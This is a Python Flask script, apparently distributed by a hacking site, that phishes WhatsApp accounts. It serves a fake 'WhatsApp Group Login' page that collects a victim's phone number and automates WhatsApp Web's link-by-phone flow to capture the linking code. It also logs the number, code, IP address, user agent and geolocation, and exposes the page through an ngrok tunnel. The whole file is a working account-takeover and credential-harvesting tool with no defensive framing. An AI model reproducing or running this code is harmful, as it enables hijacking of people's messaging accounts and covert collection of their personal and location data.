from flask import Flask, request, render_template_string
import subprocess
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import pytesseract
from PIL import Image, ImageEnhance, ImageFilter
import requests
import json
import os


def display_banner():
    banner = """
    ┓ ┏┓┳┓          
    ┃ ┗┓┃┃┏┓┏┓┏┓    
    ┗┛┗┛┻┛┗ ┗ ┣┛    
┓┏┏┳┓┳┓    ┓  ┛     
┣┫ ┃ ┃┃┏┓┏┓┃┏ ┏┏┓┏┳┓
┛┗ ┻ ┻┛┗┻┛ ┛┗•┗┗┛┛┗┗
                                                                   
    Dev By: LSDeep | Version: 1.0.0
              HTDark.com
    """
    print(banner)
    print("[*] Waiting to run the script...")

display_banner()
time.sleep(15)


app = Flask(__name__)

# Ngrok AuthToken
NGROK_AUTH_TOKEN = "NGROK_AUTH_TOKEN"

# path to Tesseract executable
pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'

# content to serve
html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Group Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Roboto', sans-serif;
            background-color: #EDEDED;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: url('https://i.ibb.co/K949c7m/peakpx-1.jpg') no-repeat center center fixed;
            background-size: cover;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
        }
        .login-box {
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            padding: 40px;
            width: 350px;
            text-align: center;
            position: relative;
        }
        .logo {
            width: 80px;
            margin-bottom: 20px;
        }
        h2 {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
        }
        form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            outline: none;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #25D366;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #1EBE54;
        }
        .options {
            display: flex;
            justify-content: space-between;
            width: 100%;
            margin-top: 10px;
        }
        .help-link, .create-account {
            color: #25D366;
            font-size: 14px;
            text-decoration: none;
            transition: color 0.3s;
        }
        .help-link:hover, .create-account:hover {
            color: #1EBE54;
        }
        #thank-you-message {
            display: none;
            margin-top: 20px;
            font-size: 18px;
            color: #333;
        }
    </style>
    <script>
        function handleFormSubmit(event) {
            event.preventDefault();
            const form = document.querySelector('form');
            const thankYouMessage = document.getElementById('thank-you-message');
            const formData = new FormData(form);

            fetch('/submit', {
                method: 'POST',
                body: formData
            }).then(response => {
                if (response.ok) {
                    form.style.display = 'none'; 
                    thankYouMessage.style.display = 'block';
                }
            }).catch(error => {
                console.error('Error submitting form:', error);
            });
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://i.ibb.co/xXm6mcy/764939-media-social-square-whatsapp-icon.png" alt="Logo" class="logo">
            <h2>WhatsApp Group Login</h2>
            <form onsubmit="handleFormSubmit(event)">
                <input type="text" name="phone_number" placeholder="Enter your phone number" required>
                <button type="submit">Submit</button>
                <div class="options">
                    <a href="#" class="help-link">Forgot Help / OTP?</a>
                    <a href="#" class="create-account">Create your Account</a>
                </div>
            </form>
            <div id="thank-you-message">Thank you for joining the group!</div>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_content)

@app.route('/submit', methods=['POST'])
def submit():
    phone_number = request.form.get('phone_number')
    user_info = get_user_info(request)
    otp_code = automate_whatsapp_web(phone_number)
    save_user_data(phone_number, otp_code, user_info)
    return '', 204

def get_user_info(request):
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    location_data = get_location_data(ip_address)
    return {
        'ip_address': ip_address,
        'user_agent': user_agent,
        'location_data': location_data
    }

def get_location_data(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        return response.json()
    except Exception as e:
        print(f"Error fetching location data: {e}")
        return {}

def automate_whatsapp_web(phone_number):
    driver = webdriver.Chrome() 
    driver.get('https://web.whatsapp.com/')
    print("Please scan the QR code in the browser to log into WhatsApp Web.")
    time.sleep(15) 

    otp_code = None
    try:
        link_with_phone_button = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, "//span[@role='button' and text()='Link with phone number']"))
        )
        link_with_phone_button.click()
        print("Selected 'Link with phone number' option.")
        
        phone_input = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.XPATH, "//input[@aria-label='Type your phone number.']"))
        )
        phone_input.send_keys(phone_number)
        print(f"Phone number {phone_number} entered into WhatsApp Web.")
        
        next_button = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Next')]"))
        )
        next_button.click()
        print("Clicked the 'Next' button.")
        
        otp_element = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.XPATH, "//*[@data-link-code]"))
        )
        otp_element.screenshot("otp_code.png")
        print("Screenshot taken of OTP code.")

        otp_code = extract_text_from_image("otp_code.png") or format_otp_code(driver.execute_script("return arguments[0].innerText;", otp_element))
        print(f"Extracted OTP Code: {otp_code}")

    except Exception as e:
        print(f"Error interacting with WhatsApp Web: {e}")

    finally:
        driver.quit()

    return otp_code

def extract_text_from_image(image_path):
    try:
        image = Image.open(image_path)
        image = image.convert('L')
        image = image.filter(ImageFilter.SHARPEN)
        image = ImageEnhance.Contrast(image).enhance(2)
        text = pytesseract.image_to_string(image)
        return text.strip()
    except Exception as e:
        print(f"Error extracting text from image: {e}")
        return None

def format_otp_code(raw_code):
    code = ''.join(raw_code.split()).replace("-", "-")
    return code

def save_user_data(phone_number, otp_code, user_info):
    try:
        with open("user_data.txt", "a") as file:
            file.write(f"Phone Number: {phone_number}\n")
            file.write(f"OTP Code: {otp_code}\n")
            file.write(f"IP Address: {user_info['ip_address']}\n")
            file.write(f"User Agent: {user_info['user_agent']}\n")
            file.write(f"Location Data: {json.dumps(user_info['location_data'], indent=4)}\n")
            file.write("="*40 + "\n")
        print("User data saved successfully.")
    except Exception as e:
        print(f"Error saving user data: {e}")

def start_ngrok():
    ngrok_command = f'ngrok http 5000 --authtoken {NGROK_AUTH_TOKEN}'
    try:
        process = subprocess.Popen(ngrok_command, shell=True)
        print("Starting ngrok tunnel...")
        time.sleep(5)
        print("Ngrok tunnel started.")
    except FileNotFoundError:
        print("Error: Ngrok is not installed or not recognized as a command.")
    except Exception as e:
        print(f"Error starting ngrok: {e}")

if __name__ == '__main__':
    start_ngrok()
    app.run(port=5000)
